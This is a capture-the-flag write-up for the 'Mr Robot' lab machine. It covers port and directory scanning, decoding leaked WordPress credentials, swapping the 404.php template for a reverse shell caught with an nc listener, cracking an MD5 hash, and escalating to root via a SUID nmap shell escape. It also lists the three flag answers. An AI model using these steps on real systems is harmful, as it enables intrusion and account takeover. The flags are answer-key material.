# Mr Robot CTF Writeup

> Machine : Linux

> Can you root this Mr. Robot styled machine? This is a lab machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.129.154.236 -p-
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ff:a6:f2:50:1d:9a:6d:4d:0b:fa:80:bf:45:5b:39:21 (RSA)
|   256 3f:f2:0c:88:5f:68:f2:38:bf:49:a4:8d:e3:07:32:67 (ECDSA)
|_  256 e5:cb:48:d4:b5:82:6b:6b:1e:16:1f:2e:34:9f:35:a9 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From our results, we can see ports 22 (SSH), 80 (HTTP) and 443 (HTTPS) are open.

There is nothing can help us on `http://10.129.154.236/`.
So let's use `gobuster` to find the if there is some hidden directories.

```shell
gobuster dir -u http://10.129.154.236/ -w /usr/share/wordlists/dirb/common.txt
```

There is three interesting directories we can see. 

```text
robots.txt           (Status: 200) [Size: 41]
wp-admin             (Status: 301) [Size: 239] [--> http://10.129.154.236/wp-admin/]
license              (Status: 200) [Size: 309]
```

Browsing `http://10.129.154.236/robots.txt` we found:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`fsocity.dic` which is a word list of passwords. And `key-1-of-3.txt` and This is the first key.

```shell
curl http://10.129.154.236/key-1-of-3.txt
```

```text
073403c8a58a1f80d943455fb30724b9
```

> What is key 1?
> 
> 073403c8a58a1f80d943455fb30724b9

Then let's see what's in `http://10.129.154.236/wp-admin/`.
We found a WordPress login page, which is probably the port to enter. But we have no credentials.

We don't find nothing so let's go to the third interesting directory  `/license`.
That's it we found a base64 text `ZWxsaW90OkVSMjgtMDY1Mgo=`.

```shell
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```

```text
elliot:ER28-0652
```

It seems like the credentials for the WordPress page.

User `elliot` seems to be an administrator account. This means that it has access to the Editor’s tab `Appearance → Editor`.
Since we have an admin account, we can simply replace one of the template’s code like `404.php`, with PHP code that will launch a reverse shell for us.

Using `revshells.com` we can easily chose the shell we need. And then replace it with the `404 Template`.

```shell
nc -lnvp 1234
```

After that we have to enter `404.php` page to execute the code. URL=`http://10.129.154.236/wp-admin/file=404.php&theme=twentyfifteen&scrollto=570`

Now we have a shell.

```shell
id
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

```shell
ls /home/robot
```

```text
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2  2025 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

```shell
cat /home/robot/password.raw-md5
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Now we have the password hash for the `robot` user.

```shell
hashcat -m 0 robot_pass.txt /usr/share/wordlists/rockyou.txt
```

```text
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Now we have the password.

```shell
su robot
abcdefghijklmnopqrstuvwxyz
```

```shell
cat /home/robot/key-2-of-3.txt
```

```text
822c73956184f694993bede3eb39f959
```

> What is key 2?
> 
> 822c73956184f694993bede3eb39f959

```shell
find / -type f -perm -4000 2>/dev/null
```

```text
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

`/usr/local/bin/nmap` is the most interesting one if we need to escalate our privileges. 

```shell
/usr/local/bin/nmap --interactive
!sh
```

```shell
whoami
```

```text
root
```

```shell
cat /root/key-3-of-3.txt
```

```text
04787ddef27c3dee1ee161b21670b4e4
```

> What is key 3?
> 
> 04787ddef27c3dee1ee161b21670b4e4

